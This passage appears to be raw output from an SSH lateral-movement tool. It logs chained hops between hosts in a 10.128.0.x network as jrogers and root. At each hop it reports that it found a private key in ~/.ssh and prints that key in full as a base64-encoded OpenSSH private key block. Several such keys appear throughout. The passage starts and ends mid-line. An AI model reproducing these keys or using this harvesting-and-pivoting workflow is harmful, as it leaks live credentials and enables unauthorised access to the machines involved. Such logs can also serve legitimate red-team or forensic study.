2phUm54ejN2R0Z2S2RnZ3hPdHpqNTVpeWcKRGJmOGF1TGI4Q2w4TWZVNGdWRkxjZ2lOaER0UXFrRWxnd29GeXVwKzhJckdLU1hBQUFBTUVBenVSUlY3RURiS0VaWGhsQQpGQ3g4Q1oxWjlWS1pBU3BVS3VrUzNVb3Y0enhrTENaWjR4RzUvZUtjeVAvdUkzMVgrclJsMFRncUlkMjZzOG1KSHFTTE9WCkNiSzBFcG9XY0lUamttK0szZHVwWXJvVUNKeExWeHdMdVR6U09DbUtoWDNTV0JQK2lMR1hsV0hzekdyeG9wSWQ5SkcrbWMKWm9TWVAzYVJXTDlWUG9uSFc2WjhoL0VjSkxmVEVxM21OeUZTdU5CakdudXl6dVpyeHJqUER1ZGhvckEyRExFNVpMZHJ1VApuaVBjREtFWFBlL25lcnh1bUtlWTFxSmdkVm5RVmJBQUFBd1FERDFWV1FUcHpNd3VuamdNa01zUXdIY3ZUeHcyOTZnM2hOClRhSFF6ZkJNcDExODREWkc2RXJDSm5aS3JIU0dwYThFSGtURmlXOEc1bGJzNG5iQWtLMG5KUmNVaStyaHU2cVhQNml3Qm0KandQYjVsNldDdmVSVW5OckRBcmZ4SGNQM3hUelVBYW1HUitQYURBejY2V3U0UlR3ZUZYZW9vVHV0ZDg3ZDBPU1RPRkZXWQpWUnFCb0tKcW5Weml0Qm5VeVdhS3IyMjgweXVUdTUzU1lHOEtIeXFab25oZFFFSURCS2lwUmgvYzNRSGwwOXU2SWlueWVyCmZXNENGT2tiazV4VDBBQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwekFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020318]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: Discovered unusable private key in [/home/jrogers/.ssh/protected]\n[1704020318]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/protected]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJEdUlHSGd4RAp5MEh0WW9QUmUwK1VBUEFBQUFFQUFBQUFFQUFBR1hBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEQXIvWWZCRWpnCmE0QnMycnJWWUhSVk1ramxEcHU0T2hDMEJBcWVRYlZYd0l0czNRb09vSkZmMGErSFNDRG5DR0FUblY1SHpkYUR0eENRbVIKMmdzdlczY29CT0tZbThBMTJkLzFxSGZFUG0rNkxoaTFjek44clp0QlV5WDRCLzRqQmFsMWJzLzczSnFRQmZYMmZEbHBJRQpJUmJGbUtqWnNqN1FIOEppRnBlYzIrbmJ2bG1SSWVPeHlPd3ZvUlJzeGcvUU1tdGR0VUp3ZHJNL2pQVVBVQlRBdllrWTFiCk9yVXJYaHdZbDJJVVFmUjY4bTU0VnU5MWpPUHY0VStjWkFJR1FEaWNQYjlodUFEeUxxR2dnQVp6eVJNak1pUkp5RFlnM3AKT3ZyNThBa3p0SHdwSUJiTEhhSzVrZ04xN0RwbFZsc2t0NEpXVFFLanZqWVJJWmp1VzUyTFJJT0JqMjAxZk1LVmhENzdwYgpoekZNbDZkdHY0cE5qU2gxYUhoMGtRRy9ldTcxeUxpLzduWTZuU2prNFd0MWNONHRKQWJ0ZnRCdmJTai80Y2RabFl5cis4CitDWW1TQTJhSlVITTFxRTlvRTV1VGhZa1RnMW91ais0NWRYcUhsU2gvaWFwT0h3Rk45WWY1RnY2ZFpSc0p1UzJmcEo5UjIKVlNlQkJVdC9LSm1SRUFBQVdROGlEUGlWbWRtUW9oSjVELzF4VWlwOG1qeUt5ZXc3eEdMODdqdG9yaEgxcGJCQlc3OHBJLwpxVWNrMFJjNmN4MmZuM0dGSmFtcVJKWTcza3h6a29jVTNVRFV4MWIvc0NJTUZLcGpVSTA5WVFueWRZdjZtN21nWk5nV0FFCktSN283eW5kTVErbnZmNk1WQWtKQ2Rha0daOC8rSTI0ck9xaHUzdHpOQzFZVG5xSTZteW9zRXJ2QUw4WEZQVmpEZld3Uy8Kd2NQeXp0b0lsV1lXWUc0cUh6NXBmM3ZobnI3bE9SWHR5WW93Z2pvc09sWFYvb0xaWWUwQXJzRHJvOW1OaFZGRlQwSTR5SQpDRTE5VmtKekJhZXpkMU9RRTdIcHQwcjhPdkZQWkJDalBsMTFKbzVQcHpmbjlnenZTMTd5M0RURWZvcXpFT25yaHVYWEF4CjJURjdWUGptSGdWQldIaDgyb3Z0c1o3YjZYZTVEV0ozSXBHSEtTNFUxSlc5dTZiRVFRRHEwbmJyVU9mMTIyTWFYYmt4TlkKL3JDZGlkTzBESElWejZvOWgyNkVQMlJrTlpwTlI4MFROT2RjYWFYV25XdytyWkl3eTZMelByeEdkbVpWUVZibW9oVXh0MQp3MEJjWW53dlVYcXN2aFpCaWxMUCs2cFFLKy9lMkVTdE80K255ZU91dFhBK01JMnRsRXVnYVZEU0x4UGpxWU9yZEpQaEJvCm5BNGlxbFltVDlTY2V6REp2VFhkaEJwZXltMmFtM0VXRTVPVjlRdElpNEZHOWEzU2lUdCs4K084TDl3enpUZjlyTVZjeGwKVGtZYzFjU0cwdEVId3RmOUFSZVBDZWVmK0dVcW92SldYMWMzZEpvWGl4aG9XRW1aUmVEZzlHOGF1WnlNd1RuZzNlR25LWAorV0w3cjRuNmtUTkVKTEdYS0hSdXgxa0tuRWx0MWN4bDNaSXROZ1RwTDd1YStMbXFHcThhby9SYzB4SHRjYXJId1VtczBPCmUxenU0YzRyK1RwemhuTmpqRzBZY0p3ek9mR21xcnc2dTdIVm5SSE9HbXVSNm5XcER3VnVCZVNtb1pmamViN1Vnb2pRbkIKSE9RSGNmQkk3d0NicmYyUVN4Nkxra2tyVVUyWXp5WGM2dGdEemhMWFZyNHVMaWxucHJnUjdwcXJSWTdvd1pmQ2Q4endlbApzWnFVVmdrTklSelArY2xZb1JMQjIwUG5sWEU4cTdVcHUrdnI2QUk2Tk5BZmJVNTNWZnkvZkovN0svSk9CK1dsanhnV3IxCjJEZ1ZVSTU4OUFCN2RkbUJveEl2aGM3YVkwMU9ielRvNTJ6RERRTkJkdXlPR2ZzZzFnQzFTZW9YbU4weDFuK3Fza1pFQWcKbVBodVEydFU2R1pWUDgzT1lJYnpyUE0yWFNrdXY3QmdJSmxvdSsyTHlaYjdLcWR0Mms1R3VLalhIOHVkUDVIN2VGUmdHUwpqN0lLVzJoL0xFUXYvOUovYmxhNTB5TXlaWnNvVVh4dlREbDhxMGdTN3AzeWZrRnpkUFZHTENSNmhlMUJQQitVSE1wUHlLClF4YnA3bzdhWGhlRm5CQy9URTdUYzgydytJNnlXZnRKUHVxazNQUFlrWEdHaTNLamE0UC9GdWxHZXpoVTUvb0pGajNVVFoKUDNBZzhHWmZ5cEpxZjFCSkhCbzBzUzBJcXN4U0srcjY3M01BTllBckpzZVVIc1IyTVhuNGlwdTQwaVJpWmFMcG5ZRHV1MwpmUzZsSEl2RVNVditjRG9oQm41MGNmalI4a3h6YlUxQ1Y2NUpmSHdUZk1jaGFHMDJ3R3p5cmJPbzNXN05kbkJSNDVtK3BVCi8yZWFYdXZkNk5Ma241SlFENmo0L2FvM1lEZ1RNaURrdlpZZU9WeEpxVjMyMjBWcUV2ZXFsMnpkSnFQSnFLTzVLU1pKSEgKaXFTcEVPSjFZa3VObExENXpaaXk1WEJ0eEJTWGU0RmRZYzlFNFlyTUhHbWNlMWcrallSelFqeWRVUUVlZjNybzF5ZzFzeQpZZ3puemlMMEtrUGtrL3pySGlEaWNhaHgwdU95NWlsaFhXQzYwcG9OZ0EyNzZqcldxNVB4MHhXTng2VFFNM2IvZHIzWGt3Ckh0S2poYW5sb2xiUWN3SGQ3VDUzRWdmZUUvU2NWbE9ZcEgyUmhlaGt6QTkwUnNiNVFFdjh6Q1AvQnhPWTludnlpK1V5cjEKa0d6QVdMOHVZdlpha3hJazkzTTlCU2tvL3VvVkpOUmlhNEhLZ2k3VnVuYWhRWU5vMStqL2Y1R1NUTWg0aVg1cDUzZGVWOApSNTRSL2kwZUN5WTd1VHJBRGJreVRtWnRIenJFbWxFeFEvaUpRdE1Ba2tFU3pFS3lRcG5hSXhzbnlTend6ZzFHbDBwMzZ1CkZmSk9mZm5kVXphZDJBWjR2K0lGVENMcFdrcEFPTDZJUTRPUWloNHRvaHIrT2laeWFLWWJKQnRJNmhld1JGbjgrUS9zQy8KdDVrQ09YdjJQUUdMNjNMUWFHVEUycVFPNi9VPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n[1704020318]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020319]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020319]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020319]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020319]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020320]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020320]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020321]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26: Discovered usable private key [3072 MD5:ce:66:2c:1c:cb:51:ae:5d:b6:57:78:52:fa:ad:85:8e jrogers@instance-4 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020321]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFxR1UzdVhNWXRoVXV0QzJLbkRqOXR2MjEzcWxPR053d0ltY2gxajlqSjloMi95dlRFV0ZZCk1SMmIvTTdWQzJONlgzZDB5OGx0R1hKQXJsdlRINEswcmJMdGNMNVdCSy9KSS8yc1U0NjlSai9GOE40M1grS2UrQWlvOTkKNHdMVjJKUlg0c3daRDRsSFNBQ3JlT3E2WlF5R0dyU3o5MnRuNy9YQUpPSVVMOGJpTUsrMWZ4aFh6MmxZYXkxTWhYaFZONQpoeDlBRTl0V1pwd1VzYzJ2Kys5blRqSW5OeU95U0N6Ym55QWFKSy9seDVtaWhKUERsQkE1NTFDUzdQNE1TeU5xc1FtQzBwCnpJTjJNcW04RG1iUnJydVpBWWNFRytKNXVINWZtR2szY0dPZ3JlSlp0VXJIR0NGQjNkUmN1RGNqemVjWmNmUzFpOERrV0QKWlJGeXQrTjlwZU5vSXM2Nk9JL0VnTENWMkczcVB3SUJIcys4RVVFNmZUUmYvRXc0eHBLVm9QZDAvcjhEUy9Sak51UE1IVwpvSU53TjFtYnpHci8wbXFNemFjektHTFZldENFLzZ6MXZJb3pNM1VRRGU0NFVQNmo4aTdFaHFXM0xiUmdYQ01iQ2lpdXdrCjBXYkdtS2o5Q0RnZm51NUl5UUp3d0dwUUxMY0Nqd1ZCQ2d1dDNXaHBBQUFGaUxoU1JlMjRVa1h0QUFBQUIzTnphQzF5YzIKRUFBQUdCQUtobE43bHpHTFlWTHJRdGlwdzQvYmI5dGQ2cFRoamNNQ0puSWRZL1l5ZllkdjhyMHhGaFdERWRtL3pPMVF0agplbDkzZE12SmJSbHlRSzViMHgrQ3RLMnk3WEMrVmdTdnlTUDlyRk9PdlVZL3hmRGVOMS9pbnZnSXFQZmVNQzFkaVVWK0xNCkdRK0pSMGdBcTNqcXVtVU1oaHEwcy9kclorLzF3Q1RpRkMvRzRqQ3Z0WDhZVjg5cFdHc3RUSVY0VlRlWWNmUUJQYlZtYWMKRkxITnIvdnZaMDR5SnpjanNrZ3MyNThnR2lTdjVjZVpvb1NUdzVRUU9lZFFrdXorREVzamFyRUpndEtjeURkaktwdkE1bQowYTY3bVFHSEJCdmllYmgrWDVocE4zQmpvSzNpV2JWS3h4Z2hRZDNVWExnM0k4M25HWEgwdFl2QTVGZzJVUmNyZmpmYVhqCmFDTE91amlQeElDd2xkaHQ2ajhDQVI3UHZCRkJPbjAwWC94TU9NYVNsYUQzZFA2L0EwdjBZemJqekIxcUNEY0RkWm04eHEKLzlKcWpNMm5NeWhpMVhyUWhQK3M5YnlLTXpOMUVBM3VPRkQrby9JdXhJYWx0eTIwWUZ3akd3b29yc0pORm14cGlvL1FnNApINTd1U01rQ2NNQnFVQ3kzQW84RlFRb0xyZDFvYVFBQUFBTUJBQUVBQUFHQUNjZUhDdkFTT1ZEVm00VWhqWjBKcnZ6ZytRCk5nRTdXRjNobWJMM1FTOEJkMEliR0wybkNLeko5cGxhNzFWR244aTFyR242Y2MvT05UdWt4KzRFK1k2cFYva0pLZE1EeDkKTStmaGdDREVBVFptNm13ZFR5WThFUzkva0pXSXVybTU1UjFFd0NFSkxxWHRZYkh6U1NpcGZGbWZ0d2tDZmVxMkxjTzhnZApZQUR1MWVEK2Exa2drRjBQMDNtWC9oQlU4cHVaMG8vWDQ1Y0ZBVUs1ZEVaeDhxSXJKcThKclVHYmp4TURhUERoNWcrOHlDClVheTdLUGdnUkx5N0s2UTlWb2ZCN0UvM3dMR2RWbDJlQ2hnWDR2MlFzUU5qazNZdldZKzdORW5kT3VvU1JZd3luOFBLdzEKcUdPTmJMcTJyU1NsOG16b0xYeTVMcmovV25zTHU2YWZtcTYvOUpOaDBWamNDRkZCNEUzTUI2U1lkNUpSeUxxUEZaRHBPRgpsbG81bEovN0c2Sk9OaWFyanhaZTdobitpLzMvWTkwVVEyN3lpaUUxUlowV3A0L0lRSkZoSGRJejVNSVBFWnRobjk2ZzlyCjB3OFVKMTE5QldDcmlHWTlldG84K1VoRjZmNVlocys0N255a2ZwblFHQ2NWRXBRV1kvbEJobkxtMXE1ZGpJWXZMNUFBQUEKd0Z0TGdFc3lSVEFCa2QxZVA2cXMycG5oM2NWY2RUcTdSSWRwcFNGTmtMQUc1dE1sam9UajVNL1QxSjJMbFVJcXIzRFFJbQpxSFQ4KzVIN3V3N1BudEg2OHE1UXo2NmRqajF3ZVhjMVJ1MHhtc3JKc2M4NFJ0ZG9tSGtuUnp3MUpubis2eUtLbUdvVUhpCjJ0N0JOZHBBdC9HZElNMitES0RCVjVqbUREaUdHblJvdUVvSjBKb0VZeGtpTFFwL0xWNzhtMHU4MktwN212cW1rNmY4MDYKcEl1ME10cnpUME55ZFZ6QzQvRjZ0RkZ3WVIycmtucGRpMWU5d0NxUUpPZFQ2UDBnQUFBTUVBMTYvTUtiVlAxbnhlRC8yUQpxTGlkdjFqc2QrWVNPNThQQXRNM0c2QVJ3TEFrNktpSktFUHpWUUJtRDZzNVZsRi9mM2kwQWh1c2pMQnJGZjhDbTRtUmhRClpvM3dIN2Jabkl0dG1sT21VNERRVWhIZUU3RzdSQ2JIRUx3U2tybE5ocTdwYldyUk9nOUxmYVBPZkNNaEN1NzBmWTcwSWIKa3JPRytpay83b1ByQkc1dk0rNmw5SkorNWpLMlM5Sm9hb25GdGFJY1FYeXBuOUpFbTZramVZcjJVZzdnNkV3WjMrSzM0RQpOdHN5OUczNDVsdXJQNjBZTldOK2VrZkhWQnlNdURBQUFBd1FESDNwNkpFSCtDZCt4eW1SaDhVTlo3RmFLeXNNVmRMdDRNCllIVVZKVTJPQ2lIRUhoT0xXdzR2R3dLUWZsZDdNME1mTlVTRDE5SmZkMEVMTFNHUmhEeTdKaGpkYUNTMHdtZWlXYUc3OFYKcDhJSHFJYXlmd1BJWCtiY0t2SEErTysyM1pzckJRaUxKRHZES1VmYTA3bjV5dnNFMnFaZEdtaFAxQmcvanBKSFpHek9ESwozL0FxYlkzVWczS3RMM3VnaFhmSGEzSm5Iam5lUytYZ0tyOEtJQUFyTTFmUFFQcS9QVHZMU2Rzb2VjTzB2eEcxK1Aza2F3CkxyRFdFa2k2VUFuS01BQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwMEFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020321]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020322]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020322]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020322]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020322]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020322]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020322]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020322]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020322]     jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->root@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020323]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: Discovered usable private key [3072 MD5:a5:d8:9d:c3:32:08:3f:72:b8:57:05:f8:f7:69:63:46 jrogers@instance-7 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020323]     jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->root@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2ZUxNOFdvZkYzZXVaSVZiM3dNMEVTQktQaFNQYkRqNkZEUGdEc2tSUHNZc1g2SVg2b1dpCjc5dUtKL3B0ek1TZjBjRkFyaWxLK01WbjVLOE9ndENhK2UyWlkxUEwxZUQ2VzluRzhQcThYTUVybGtUekVNTjUwRUx3T1IKdmRMSW10SVpOelZKQTVLTjN6azNKY05xVEo2MHk2dnRReEV3VjcxVGVNTUdDTTAwaHBUYXZnR0ZmTnRDVjBRcWM3aWtwdApqd1ZFTWJJdGJiM2szZXpUakRVUEc4Ym5qbDd5cC9VNG1CaWFxTDdBUENjOVdWV0hTYUpEcHE3VXpJdTNwRWVWMFcrYlhVCnp3eFJ0bXRCNStxbnRUcjdOajlUaERZaTh0bVdqdnFISWY4QnNaMkpnLzNrQWRuT1JFSDFxRVZnejQ0RFNHWWxsSDdGK3kKbEtVa3VlbXFTdkFRQ0pET051d1JHaTFDb0lPRGtiR0pCSFhRbW12MXpYQkRtZmdFQ2kyOHFjQkU5UFRXeXN2L3lLUWJLeApycmZzVUQ2cUIrR3c5RUU3NW5udXdCMENEUzRuZld1ZEVTc2prVXZjcmZnd3BEN3lYOFhIQ0JKUmozK0NGbm5yYy9qN0c0CkZtR0lTVUt4ZmR3dlBMbmFKWUtVdnArYzhwTkcwK3l4VVVMcm1VT2ZBQUFGaUlHUVNVV0JrRWxGQUFBQUIzTnphQzF5YzIKRUFBQUdCQUwzaXpQRnFIeGQzcm1TRlc5OEROQkVnU2o0VWoydzQraFF6NEE3SkVUN0dMRitpRitxRm91L2JpaWY2YmN6RQpuOUhCUUs0cFN2akZaK1N2RG9MUW12bnRtV05UeTlYZytsdlp4dkQ2dkZ6Qks1WkU4eEREZWRCQzhEa2IzU3lKclNHVGMxClNRT1NqZDg1TnlYRGFreWV0TXVyN1VNUk1GZTlVM2pEQmdqTk5JYVUycjRCaFh6YlFsZEVLbk80cEtiWThGUkRHeUxXMjkKNU4zczA0dzFEeHZHNTQ1ZThxZjFPSmdZbXFpK3dEd25QVmxWaDBtaVE2YXUxTXlMdDZSSGxkRnZtMTFNOE1VYlpyUWVmcQpwN1U2K3pZL1U0UTJJdkxabG83Nmh5SC9BYkdkaVlQOTVBSFp6a1JCOWFoRllNK09BMGhtSlpSK3hmc3BTbEpMbnBxa3J3CkVBaVF6amJzRVJvdFFxQ0RnNUd4aVFSMTBKcHI5YzF3UTVuNEJBb3R2S25BUlBUMDFzckwvOGlrR3lzYTYzN0ZBK3FnZmgKc1BSQk8rWjU3c0FkQWcwdUozMXJuUkVySTVGTDNLMzRNS1ErOGwvRnh3Z1NVWTkvZ2haNTYzUDQreHVCWmhpRWxDc1gzYwpMenk1MmlXQ2xMNmZuUEtUUnRQc3NWRkM2NWxEbndBQUFBTUJBQUVBQUFHQWVyUksxMTVLUlRIem9jV0R2ck1sUEVQdmRmCnAzUytudHdJeGRKM0RMRWhPaHJSTGovWXJwNWJHcXIzYm02VUhPUFE5eXFwaklkOFdwQTJBVU1uaDNEVFo2dm5MeDczMzQKaXM1Si9vTW9vWSs2aU5wNWI4WEJ1OURseHlHNFpRVjZ1WTI5STFJbmZiOGZuWkp6QUdTd2pyc0Ftandva2pBaSszOXZ1Zgp0S1JXWXZsaCtSS21uaTVaeW1ha1FDOTdSczQ5VDFZbC9QZDNFVXFreFZ6KzZobXNPSDhycHNlQmpBdjVoMnFNRExISlFHCjB1bXdDT2N3YkUvaDkyUDZBZEMzWkthQ2ZJV3piaHFHM2ZpY3dpMU5DYm1ZR2tER0plenNkRFZDUmwxajNxQkV5UnJHdE8KbWpRRytUb3p2Vi9GK1hxNnUzVkltQTFLaEYreHZBMk1WSGowQ3RITFdTQTBNN2RrbGYrdEUvUDZRWEl2OG5UQktHUzErQQpONlcwS1B6RWhaQk9SVlYwb0dLOU15NkVSbGxENGNqenZoTVhDRDg1blY4NEY0ZGMvb251RGFKNGVsb05ONkZ1aWRsUlhLClR4dzhXTVVYRjE3MGVpRlJ3bi9qVnY3bjNsYVptUUlQSnVBYXliMUF0ZkdjZzczT3VJd2IwbXBUeld5blcwSzBEaEFBQUEKd1FDaHcwZXMvRkdrUndsbEFYTmlPd201eHNnQWhLQUFkcHRYU3VLWWRvQlNQYklleVBGNnQ3VlVzclI0MmlmMHF0NDdmTApzMVVFeU1qRnNQcEVRMEFTbHlPUEk0U1h3NHlWaUhaTVluZ2pWOExIZ3FkOXY3a2o4cEJlNXMvNCtiZnpCUVpWbDJHQkNvCk5zdVI0cVZlMGZDbGlQd3pjMDcwOERGdnJoa2dNQXpPSWYwOWptdzkxd2dESmxuUWN1REVtZGdVSjBZY3NWMXZ2emp4NDcKbThWcFlhQzN3clBlc3FqMWdjK2RjdWJKSjlqN01ycmxnZlZsclliMTFTTi9weFAxTUFBQURCQU9CekJnWmhva0kyRzRGcwpGUXhjaVFOZUlERkFkZTJEMDdTTzRidG5vVEJSRmhKZ2VNVUFyQ2RkZGQ0NzFpZ0FSMWtCdU8rb3Nid2lXeEZtbCtPMEF3CmN5TlNtaWZGaGlMWG1VVmpnNytPdHRlSmFlaVE4OWtQT0FYQlErSzUyWXB0TERuM05IYmN6NHQ4SjRiUG4zRVkzeUZFcnQKYUVxb29HWExyNVBxRkNqQU0zemIwcVdqZmNTT3JFTjRKK0Z3cCt6blZXZU90MHoyMzJ4T2dmTDhKNUk1anZqSTlFUEU0Vgp6UDdNbUNTRklaWDNwMm9ZWTgxeEkwRyt2cWpwUXNHUUFBQU1FQTJKUDgvWmxmK0ZYbldKQ3FiUWtlbXlBa3UycE5UT1pWCnF2U3ZaZ3lTdUtmRW9pZ29zRlRCbzBITURKVEEzb3pSOVF5blJHR1BXRHprQXRwZit3N3RrQ3ZrdWtob2VOZ3FjSldBSGwKVE51dUlEQTlZaEVSYVFHTTRSVlhQQUZWWlhzOStTVzgxS2ZYWGQxQktQcnpDNXVqS1JrbFhheUsrbWE1VWl0TVpZMUhFKwpFSzBKbjM4enZiQ1BqbUYrNkE2Zm1GZkdLby9NdDVjYXFFc3U2NWVjQ05qTFhPRTlOdEJ0cm9yWGo1S0RoRWFQb1VkZ3JkCmNoSDI1L1gyVGZWMlIzQUFBQUVtcHliMmRsY25OQWFXNXpkR0Z1WTJVdE53PT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020323]     